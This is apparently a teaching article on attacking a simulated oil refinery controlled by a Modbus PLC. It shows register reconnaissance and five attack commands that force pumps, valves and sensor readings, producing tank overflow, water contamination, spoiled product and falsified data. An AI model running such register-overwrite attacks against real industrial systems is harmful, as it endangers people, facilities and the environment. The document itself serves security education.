---
cover: ad
date: 2025-03-26
tags:
- advanced
- attack
- ot-ics
---
We have already seen how to attack the Bottle Filling system. This article follows up on that analysis, in a significantly more complex scenario.

## Reconnaissance Phase

The Bottle Filling system operated automatically. The Oil Refinery, instead, requires the supervision of an operator who interacts with it via an HMI: in particular, the operator decides when to move from one processing phase to the next.

We analyze how the PLC registers change while we interact with the HMI.

For this purpose, I developed a small tool that continuously monitors the [[Introduction to Modbus protocol|Modbus]] registers to determine which ones are in use. The tool is available in [my GitHub repository](https://github.com/dainok/courses/tree/master/Various/Modbus%20tools).

A real attack would be much more complex, because the attacker has no visual feedback from the HMI or from the system itself.

To monitor the behavior of the PLC continuously, we run:

```bash
./modbus_monitor.py -i 172.26.104.22 -p 502 -t holding
```

**System idle:** all registers report the value `0`.

![[oil-refinery-stopped-2.png]]

**Filling the tank:** as soon as the feed pump is activated, register `1` is set to `1`. When the crude oil reaches the level sensor, register `1` returns to `0` and register `2` is set to `1`.

![[oil-refinery-started-2.png]]

From this, we deduce:

* **Register 1:** actuator, defines the state of the feed pump (open/closed).
* **Register 2:** sensor, detects whether the tank is full (tank level sensor).

**Draining the tank:** when the discharge valve is opened, register `2` remains unchanged, register `3` is set to `1`, and registers `6` and `7` increment.

![[oil-refinery-separating.png]]

From this, we deduce:

* **Register 3:** actuator, controls the tank discharge valve (open/closed).
* **Register 6:** sensor, requires further investigation.
* **Register 7:** sensor, requires further investigation.

**Water discharge:** when the water discharge valve is opened, registers `2` and `3` remain unchanged, register `8` is set to `1` and register `6` increments.

![[oil-refinery-water-discarge.png]]

From this, we deduce:

* **Register 6:** sensor, measures the amount of discharged water.
* **Register 8:** actuator, controls the water discharge valve (open/closed).

**Oil discharge:** when the oil discharge valve is opened, registers `2`, `3` and `8` remain unchanged, register `4` is set to `1` and register `7` increments rapidly.

![[oil-refinery-oil-discharge.png]]

From this, we deduce:

* **Register 4:** actuator, controls the oil discharge valve (open/closed).
* **Register 7:** sensor, measures the amount of produced oil.

## Attack Phase

Before planning the attacks, let's summarize the findings of the reconnaissance:

* **Register 1:** actuator, controls the feed pump (open/closed).
* **Register 2:** sensor, detects whether the tank is full (tank level sensor).
* **Register 3:** actuator, controls the tank discharge valve (open/closed).
* **Register 4:** actuator, controls the oil discharge valve (open/closed).
* **Register 6:** sensor, measures the amount of discharged water.
* **Register 7:** sensor, measures the amount of produced oil.
* **Register 8:** actuator, controls the water discharge valve (open/closed).

Registers `6` and `7` are the only ones with incremental values.

Now let's try to force the register values by overwriting them continuously. For this purpose, I developed a small tool that continuously writes a specific value to one or more Modbus registers of a PLC. The tool is available in [my GitHub repository](https://github.com/dainok/courses/tree/master/Various/Modbus%20tools).

## Scenario 1: Feed Pump Forced Closed

Regardless of the state of the sensors, the feed pump remains closed, even if an operator intervenes manually via the HMI.

```bash
./modbus_write.py -i 172.26.104.22 -p 502 -s h 1 0
```

**Effect:** the production line remains halted.

## Scenario 2: Feed Pump Open and Tank Level Sensor Disabled

Regardless of the level of crude oil in the tank, the pump remains open.

```bash
./modbus_write.py -i 172.26.104.22 -p 502 -s h 1 1 -s h 2 0
```

**Effect:** the crude oil overflows from the tank and floods the facility.

![[oil-refinery-attack-scenario-2.png]]

## Scenario 3: Oil Discharge Valve Forced Closed

The feed pump and the water discharge valve are forced open, while the oil discharge valve is forced closed.

```bash
./modbus_write.py -i 172.26.104.22 -p 502 -s h 1 1 -s h 3 1 -s h 4 0 -s h 8 1
```

**Effect:** all the oil is discharged through the water pipeline, contaminating it.

![[oil-refinery-attack-scenario-3.png]]

## Scenario 4: Altered Product

The feed pump is forced open, the water discharge valve is forced closed, and the oil discharge valve is forced open.

```bash
./modbus_write.py -i 172.26.104.22 -p 502 -s h 1 1 -s h 3 1 -s h 4 1 -s h 8 0
```

**Effect:** the oil is not properly refined.

![[oil-refinery-attack-scenario-4.png]]

## Scenario 5: Unknown Production Data

The values of the two sensors are overwritten with arbitrary values.

```bash
./modbus_write.py -i 172.26.104.22 -p 502 -s h 6 999 -s h 7 111
```

**Effect:** it becomes impossible to determine accurately the amount of refined oil. Operators and all the processes that rely on this data are compromised.

![[oil-refinery-attack-scenario-5.png]]
